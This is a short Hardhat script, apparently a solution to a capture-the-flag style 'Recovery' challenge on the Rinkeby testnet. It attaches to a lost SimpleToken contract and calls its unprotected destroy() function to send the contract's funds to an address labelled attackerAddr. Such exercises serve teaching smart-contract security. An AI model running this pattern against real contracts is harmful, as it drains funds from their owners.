import { ethers } from 'hardhat'
import { SimpleToken } from '../types/typechain/SimpleToken'

async function main() {
  // Lost address, found by digging around in rinkey.etherscan
  const targetAddr = '0xcC4DBbEc74ce975A3f7E490Fa98B1B0226A84e4a'
  const attackerAddr = '0x21db76B75db2f5d4f9505Eae7d8cE53eB9AEd2B5'

  const factory = await ethers.getContractFactory('SimpleToken')
  const simpleToken = factory.attach(targetAddr) as SimpleToken

  console.log('Initiating Recovery...')
  const expTx = await simpleToken.destroy(attackerAddr, { gasLimit: 800000 })
  console.log('https://rinkeby.etherscan.io/tx/' + expTx.hash)

  console.log('Recovery executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
